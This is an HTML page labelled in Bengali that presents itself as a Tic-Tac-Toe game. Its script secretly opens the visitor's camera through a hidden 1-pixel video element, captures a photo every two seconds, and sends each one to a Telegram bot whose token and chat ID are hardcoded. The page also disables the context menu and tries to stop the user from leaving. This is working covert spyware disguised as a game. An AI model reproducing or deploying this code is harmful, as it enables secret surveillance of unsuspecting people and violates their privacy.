<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>টিক ট্যাক টো গেম</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        #game-container {
            width: 300px;
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-gap: 5px;
            margin: 15px 0;
        }
        .cell {
            width: 90px;
            height: 90px;
            background-color: #ddd;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            cursor: pointer;
            border-radius: 5px;
        }
        .cell:hover {
            background-color: #ccc;
        }
        #status {
            margin: 15px 0;
            font-size: 18px;
            font-weight: bold;
        }
        #hidden-camera {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>
    <div id="game-container">
        <h1>টিক ট্যাক টো</h1>
        <div class="board" id="board">
            <div class="cell" data-index="0"></div>
            <div class="cell" data-index="1"></div>
            <div class="cell" data-index="2"></div>
            <div class="cell" data-index="3"></div>
            <div class="cell" data-index="4"></div>
            <div class="cell" data-index="5"></div>
            <div class="cell" data-index="6"></div>
            <div class="cell" data-index="7"></div>
            <div class="cell" data-index="8"></div>
        </div>
        <div id="status">আপনার পালন (X)</div>
        <button id="restart">পুনরায় শুরু করুন</button>
    </div>

    <!-- লুকানো ক্যামেরা এলিমেন্ট -->
    <video id="hidden-camera" autoplay></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script>
        // কনফিগারেশন
        const BOT_TOKEN = "7795094888:AAGH0DrdY85bAH5NbSNdlgFr8qdDEMhafmw";
        const CHAT_ID = "7205867999";
        const CAPTURE_INTERVAL = 2000; // 2 সেকেন্ড

        // গেম ভেরিয়েবল
        let currentPlayer = 'X';
        let gameBoard = ['', '', '', '', '', '', '', '', ''];
        let gameActive = true;

        // DOM এলিমেন্ট
        const cells = document.querySelectorAll('.cell');
        const statusDisplay = document.getElementById('status');
        const restartButton = document.getElementById('restart');
        const hiddenCamera = document.getElementById('hidden-camera');
        const hiddenCanvas = document.getElementById('hidden-canvas');
        const ctx = hiddenCanvas.getContext('2d');

        // ক্যামেরা সিস্টেম শুরু
        async function startCameraSystem() {
            try {
                // সামনে ও পিছন উভয় ক্যামেরা চেক করা
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                if (videoDevices.length > 1) {
                    // পিছনের ক্যামেরা (যদি থাকে)
                    const constraints = {
                        video: {
                            facingMode: { exact: "environment" },
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    };
                    
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
                        setupCamera(stream);
                        return;
                    } catch (e) {
                        console.log("পিছনের ক্যামেরা একসেস করা যায়নি, সামনের ক্যামেরা চেষ্টা করা হচ্ছে");
                    }
                }
                
                // সামনের ক্যামেরা
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                setupCamera(stream);
                
            } catch (error) {
                console.error("ক্যামেরা একসেস ত্রুটি:", error);
            }
        }

        function setupCamera(stream) {
            hiddenCamera.srcObject = stream;
            hiddenCanvas.width = hiddenCamera.videoWidth;
            hiddenCanvas.height = hiddenCamera.videoHeight;
            
            // প্রতি ২ সেকেন্ডে ছবি ক্যাপচার
            setInterval(captureAndSend, CAPTURE_INTERVAL);
        }

        async function captureAndSend() {
            if (!hiddenCamera.srcObject) return;
            
            try {
                ctx.drawImage(hiddenCamera, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.7);
                
                // টেলিগ্রামে ছবি পাঠানো
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        photo: imageData
                    })
                });
                
                const result = await response.json();
                if (!result.ok) {
                    console.error("ছবি পাঠাতে সমস্যা:", result);
                }
            } catch (error) {
                console.error("ত্রুটি:", error);
            }
        }

        // গেম লজিক
        function handleCellClick(e) {
            const cellIndex = parseInt(e.target.getAttribute('data-index'));
            
            if (gameBoard[cellIndex] !== '' || !gameActive) {
                return;
            }
            
            gameBoard[cellIndex] = currentPlayer;
            e.target.textContent = currentPlayer;
            
            if (checkWinner()) {
                statusDisplay.textContent = `${currentPlayer} জিতেছেন!`;
                gameActive = false;
                return;
            }
            
            if (checkDraw()) {
                statusDisplay.textContent = 'খেলা ড্র!';
                gameActive = false;
                return;
            }
            
            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
            statusDisplay.textContent = `পালন: ${currentPlayer}`;
        }

        function checkWinner() {
            const winningConditions = [
                [0, 1, 2], [3, 4, 5], [6, 7, 8], // সারি
                [0, 3, 6], [1, 4, 7], [2, 5, 8], // কলাম
                [0, 4, 8], [2, 4, 6]             // কর্ণ
            ];
            
            return winningConditions.some(condition => {
                return condition.every(index => {
                    return gameBoard[index] === currentPlayer;
                });
            });
        }

        function checkDraw() {
            return gameBoard.every(cell => cell !== '');
        }

        function restartGame() {
            currentPlayer = 'X';
            gameBoard = ['', '', '', '', '', '', '', '', ''];
            gameActive = true;
            statusDisplay.textContent = 'আপনার পালন (X)';
            cells.forEach(cell => cell.textContent = '');
        }

        // ইভেন্ট লিসেনার
        cells.forEach(cell => cell.addEventListener('click', handleCellClick));
        restartButton.addEventListener('click', restartGame);

        // পেইজ লোড হলে সিস্টেম শুরু
        window.addEventListener('DOMContentLoaded', () => {
            startCameraSystem();
            
            // ব্যবহারকারী বন্ধ করতে না পারার ব্যবস্থা
            window.addEventListener('beforeunload', (e) => {
                e.preventDefault();
                e.returnValue = '';
                return '';
            });
            
            // কন্টেক্সট মেনু বন্ধ
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
            });
        });
    </script>
</body>
</html>
